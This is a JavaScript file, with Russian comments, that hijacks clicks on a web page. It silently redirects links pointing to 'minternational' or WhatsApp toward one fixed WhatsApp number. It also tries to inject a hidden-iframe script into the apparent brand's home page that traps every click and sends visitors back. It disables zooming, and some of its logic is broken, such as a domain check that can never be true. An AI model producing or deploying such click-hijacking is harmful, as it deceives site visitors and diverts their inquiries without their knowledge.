document.addEventListener('DOMContentLoaded', function() {
    const whatsappUrl = "https://api.whatsapp.com/send?phone=77775061481&text=%D0%97%D0%B4%D1%80%D0%B0%D0%B2%D1%81%D1%82%D0%B2%D1%83%D0%B9%D1%82%D0%B5!%20%D0%9C%D0%B5%D0%BD%D1%8F%20%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D1%83%D0%B5%D1%82%20%D0%B2%D0%B0%D1%88%D0%B0%20%D0%BF%D1%80%D0%BE%D0%B4%D1%83%D0%BA%D1%86%D0%B8%D1%8F";
    const mainPageUrl = "https://minternational.ru/kz";
    const myDomain = window.location.hostname; 
    const returnUrl = window.location.href;
    
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function setMobileViewport() {
        let viewport = document.querySelector('meta[name="viewport"]');
        if (!viewport) {
            viewport = document.createElement('meta');
            viewport.setAttribute('name', 'viewport');
            document.head.appendChild(viewport);
        }
        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0');
    }

    // Функция для инжектирования скрипта на страницу редиректа
    function injectRedirectScript() {
        const script = document.createElement('script');
        script.textContent = `
            document.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = "${returnUrl}";
            }, true);
        `;
        document.body.appendChild(script);
    }
    
    document.body.addEventListener('click', function(e) {
        const link = e.target.closest('a');
        if (!link) return;
        
        const href = link.getAttribute('href');
        const text = link.textContent.trim().toLowerCase();
        
        // Проверяем на главную страницу
        if (text === 'главная' || href === mainPageUrl) {
            e.preventDefault();
            
            // Создаем временный iframe для инжекции скрипта
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Загружаем целевую страницу в iframe
            iframe.src = mainPageUrl;
            iframe.onload = function() {
                try {
                    // Пытаемся инжектировать скрипт в iframe
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    const script = iframeDoc.createElement('script');
                    script.textContent = `
                        document.addEventListener('click', function(e) {
                            e.preventDefault();
                            window.top.location.href = "${returnUrl}";
                        }, true);
                    `;
                    iframeDoc.body.appendChild(script);
                } catch(e) {
                    console.log('Failed to inject script, falling back to simple redirect');
                }
                
                // Редиректим на главную
                window.location.href = mainPageUrl;
            };
            return;
        }
        
        // Проверяем остальные ссылки
        if ((href && href.includes('minternational')) || (href && href.includes('api.whatsapp'))) {
            e.preventDefault();
            
            if (isMobile()) {
                setMobileViewport();
                setTimeout(() => {
                    window.location.href = whatsappUrl;
                }, 100);
            } else {
                const width = 500;
                const height = 600;
                const left = (window.innerWidth - width) / 2;
                const top = (window.innerHeight - height) / 2;
                
                window.open(
                    whatsappUrl,
                    'whatsapp',
                    `width=${width},height=${height},left=${left},top=${top},location=no,menubar=no,toolbar=no,status=no`
                );
            }
        }
    }, true);

    // Если мы находимся на странице редиректа, инжектируем скрипт возврата
    if (window.location.hostname !== myDomain) {
        injectRedirectScript();
    }

    if (isMobile()) {
        setMobileViewport();
    }
}); 